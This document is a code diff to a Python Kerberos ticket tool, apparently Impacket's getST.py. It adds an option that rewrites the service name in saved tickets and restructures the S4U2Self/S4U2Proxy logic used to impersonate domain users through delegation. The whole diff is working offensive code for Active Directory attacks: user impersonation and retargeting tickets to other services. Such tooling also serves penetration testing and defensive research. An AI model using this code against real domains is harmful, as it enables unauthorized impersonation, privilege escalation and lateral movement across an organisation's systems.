@@ -84,10 +84,43 @@ class GETST:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
     def saveTicket(self, ticket, sessionKey):
-        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
         ccache = CCache()
-
         ccache.fromTGS(ticket, sessionKey, sessionKey)
+        if self.__options.altservice is not None:
+            cred_number = len(ccache.credentials)
+            logging.debug('Number of credentials in cache: %d' % cred_number)
+            if cred_number > 1:
+                logging.debug("More than one credentials in cache, modifying all of them")
+            for creds in ccache.credentials:
+                sname = creds['server'].prettyPrint()
+                service_class = sname.split(b'@')[0].split(b'/')[0].decode('utf-8')
+                hostname = sname.split(b'@')[0].split(b'/')[1].decode('utf-8')
+                service_realm = sname.split(b'@')[1].decode('utf-8')
+                if '@' in self.__options.altservice:
+                    new_service_realm = self.__options.altservice.split('@')[1].upper()
+                    if not '.' in new_service_realm:
+                        logging.debug("New service realm is not FQDN, you may encounter errors")
+                    if '/' in self.__options.altservice:
+                        new_hostname = self.__options.altservice.split('@')[0].split('/')[1]
+                        new_service_class = self.__options.altservice.split('@')[0].split('/')[0]
+                    else:
+                        logging.debug("No service hostname in new SPN, using the current one (%s)" % hostname)
+                        new_hostname = hostname
+                        new_service_class = self.__options.altservice.split('@')[0]
+                else:
+                    logging.debug("No service realm in new SPN, using the current one (%s)" % service_realm)
+                    new_service_realm = service_realm
+                    if '/' in self.__options.altservice:
+                        new_hostname = self.__options.altservice.split('/')[1]
+                        new_service_class = self.__options.altservice.split('/')[0]
+                    else:
+                        logging.debug("No service hostname in new SPN, using the current one (%s)" % hostname)
+                        new_hostname = hostname
+                        new_service_class = self.__options.altservice
+                new_sname = "%s/%s@%s" % (new_service_class, new_hostname, new_service_realm)
+                logging.info('Changing sname from %s to %s' % (sname.decode("utf-8"), new_sname))
+                creds['server'].fromPrincipal(Principal(new_sname, type=constants.PrincipalNameType.NT_PRINCIPAL.value))
+        logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))
         ccache.saveFile(self.__saveFileName + '.ccache')
 
     def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):
@@ -428,6 +461,15 @@ class GETST:
 
         tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
+        if self.__no_s4u2proxy:
+            cipherText = tgs['enc-part']['cipher']
+            plainText = cipher.decrypt(sessionKey, 8, cipherText)
+            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
+            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
+            # Creating new cipher based on received keytype
+            cipher = _enctype_table[encTGSRepPart['key']['keytype']]
+            return r, cipher, sessionKey, newSessionKey
+
         if logging.getLogger().level == logging.DEBUG:
             logging.debug('TGS_REP')
             print(tgs.prettyPrint())
@@ -506,129 +548,120 @@ class GETST:
             # put it back in the TGS
             tgs['ticket']['enc-part']['cipher'] = cipherText
 
-        if self.__no_s4u2proxy:
-            cipherText = tgs['enc-part']['cipher']
-            plainText = cipher.decrypt(sessionKey, 8, cipherText)
-            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
-            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
-            # Creating new cipher based on received keytype
-            cipher = _enctype_table[encTGSRepPart['key']['keytype']]
-            return r, cipher, sessionKey, newSessionKey
-        else:
-            ################################################################################
-            # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
-            # So here I have a ST for me.. I now want a ST for another service
-            # Extract the ticket from the TGT
-            ticketTGT = Ticket()
-            ticketTGT.from_asn1(decodedTGT['ticket'])
+        ################################################################################
+        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
+        # So here I have a ST for me.. I now want a ST for another service
+        # Extract the ticket from the TGT
+        ticketTGT = Ticket()
+        ticketTGT.from_asn1(decodedTGT['ticket'])
 
-            # Get the service ticket
-            ticket = Ticket()
-            ticket.from_asn1(tgs['ticket'])
+        # Get the service ticket
+        ticket = Ticket()
+        ticket.from_asn1(tgs['ticket'])
 
-            apReq = AP_REQ()
-            apReq['pvno'] = 5
-            apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
+        apReq = AP_REQ()
+        apReq['pvno'] = 5
+        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
 
-            opts = list()
-            apReq['ap-options'] = constants.encodeFlags(opts)
-            seq_set(apReq, 'ticket', ticketTGT.to_asn1)
+        opts = list()
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticketTGT.to_asn1)
 
-            authenticator = Authenticator()
-            authenticator['authenticator-vno'] = 5
-            authenticator['crealm'] = str(decodedTGT['crealm'])
+        authenticator = Authenticator()
+        authenticator['authenticator-vno'] = 5
+        authenticator['crealm'] = str(decodedTGT['crealm'])
 
-            clientName = Principal()
-            clientName.from_asn1(decodedTGT, 'crealm', 'cname')
+        clientName = Principal()
+        clientName.from_asn1(decodedTGT, 'crealm', 'cname')
 
-            seq_set(authenticator, 'cname', clientName.components_to_asn1)
+        seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-            now = datetime.datetime.utcnow()
-            authenticator['cusec'] = now.microsecond
-            authenticator['ctime'] = KerberosTime.to_asn1(now)
+        now = datetime.datetime.utcnow()
+        authenticator['cusec'] = now.microsecond
+        authenticator['ctime'] = KerberosTime.to_asn1(now)
 
-            encodedAuthenticator = encoder.encode(authenticator)
+        encodedAuthenticator = encoder.encode(authenticator)
 
-            # Key Usage 7
-            # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
-            # TGS authenticator subkey), encrypted with the TGS session
-            # key (Section 5.5.1)
-            encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
+        # Key Usage 7
+        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
+        # TGS authenticator subkey), encrypted with the TGS session
+        # key (Section 5.5.1)
+        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
 
-            apReq['authenticator'] = noValue
-            apReq['authenticator']['etype'] = cipher.enctype
-            apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
+        apReq['authenticator'] = noValue
+        apReq['authenticator']['etype'] = cipher.enctype
+        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
-            encodedApReq = encoder.encode(apReq)
+        encodedApReq = encoder.encode(apReq)
 
-            tgsReq = TGS_REQ()
+        tgsReq = TGS_REQ()
 
-            tgsReq['pvno'] = 5
-            tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
-            tgsReq['padata'] = noValue
-            tgsReq['padata'][0] = noValue
-            tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
-            tgsReq['padata'][0]['padata-value'] = encodedApReq
+        tgsReq['pvno'] = 5
+        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
+        tgsReq['padata'] = noValue
+        tgsReq['padata'][0] = noValue
+        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+        tgsReq['padata'][0]['padata-value'] = encodedApReq
 
-            # Add resource-based constrained delegation support
-            paPacOptions = PA_PAC_OPTIONS()
-            paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
+        # Add resource-based constrained delegation support
+        paPacOptions = PA_PAC_OPTIONS()
+        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))
 
-            tgsReq['padata'][1] = noValue
-            tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
-            tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
+        tgsReq['padata'][1] = noValue
+        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
+        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)
 
-            reqBody = seq_set(tgsReq, 'req-body')
+        reqBody = seq_set(tgsReq, 'req-body')
 
-            opts = list()
-            # This specified we're doing S4U
-            opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
-            opts.append(constants.KDCOptions.canonicalize.value)
-            opts.append(constants.KDCOptions.forwardable.value)
-            opts.append(constants.KDCOptions.renewable.value)
+        opts = list()
+        # This specified we're doing S4U
+        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
+        opts.append(constants.KDCOptions.canonicalize.value)
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
 
-            reqBody['kdc-options'] = constants.encodeFlags(opts)
-            service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-            seq_set(reqBody, 'sname', service2.components_to_asn1)
-            reqBody['realm'] = self.__domain
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+        seq_set(reqBody, 'sname', service2.components_to_asn1)
+        reqBody['realm'] = self.__domain
 
-            myTicket = ticket.to_asn1(TicketAsn1())
-            seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
+        myTicket = ticket.to_asn1(TicketAsn1())
+        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
 
-            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
 
-            reqBody['till'] = KerberosTime.to_asn1(now)
-            reqBody['nonce'] = random.getrandbits(31)
-            seq_set_iter(reqBody, 'etype',
-                         (
-                             int(constants.EncryptionTypes.rc4_hmac.value),
-                             int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
-                             int(constants.EncryptionTypes.des_cbc_md5.value),
-                             int(cipher.enctype)
-                         )
-                         )
-            message = encoder.encode(tgsReq)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+        seq_set_iter(reqBody, 'etype',
+                     (
+                         int(constants.EncryptionTypes.rc4_hmac.value),
+                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
+                         int(constants.EncryptionTypes.des_cbc_md5.value),
+                         int(cipher.enctype)
+                     )
+                     )
+        message = encoder.encode(tgsReq)
 
-            logging.info('\tRequesting S4U2Proxy')
-            r = sendReceive(message, self.__domain, kdcHost)
+        logging.info('\tRequesting S4U2Proxy')
+        r = sendReceive(message, self.__domain, kdcHost)
 
-            tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
+        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
 
-            cipherText = tgs['enc-part']['cipher']
+        cipherText = tgs['enc-part']['cipher']
 
-            # Key Usage 8
-            # TGS-REP encrypted part (includes application session
-            # key), encrypted with the TGS session key (Section 5.4.2)
-            plainText = cipher.decrypt(sessionKey, 8, cipherText)
+        # Key Usage 8
+        # TGS-REP encrypted part (includes application session
+        # key), encrypted with the TGS session key (Section 5.4.2)
+        plainText = cipher.decrypt(sessionKey, 8, cipherText)
 
-            encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
+        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
 
-            newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
+        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])
 
-            # Creating new cipher based on received keytype
-            cipher = _enctype_table[encTGSRepPart['key']['keytype']]
+        # Creating new cipher based on received keytype
+        cipher = _enctype_table[encTGSRepPart['key']['keytype']]
 
-            return r, cipher, sessionKey, newSessionKey
+        return r, cipher, sessionKey, newSessionKey
 
     def run(self):
 
@@ -664,7 +697,10 @@ class GETST:
         if self.__options.impersonate is None:
             # Normal TGS interaction
             logging.info('Getting ST for user')
-            serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            if self.__no_s4u2proxy and self.__options.spn is not None:
+                serverName = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+            else:
+                serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_SRV_INST.value)
             tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)
             self.__saveFileName = self.__user
         else:
@@ -699,6 +735,7 @@ if __name__ == '__main__':
     parser.add_argument('identity', action='store', help='[domain/]username[:password]')
     parser.add_argument('-spn', action="store", help='SPN (service/server) of the target service the '
                                                                     'service ticket will' ' be generated for')
+    parser.add_argument('-altservice', action="store", help='New sname/SPN to set in the ticket')
     parser.add_argument('-impersonate', action="store", help='target username that will be impersonated (thru S4U2Self)'
                                                              ' for quering the ST. Keep in mind this will only work if '
                                                              'the identity provided in this scripts is allowed for '
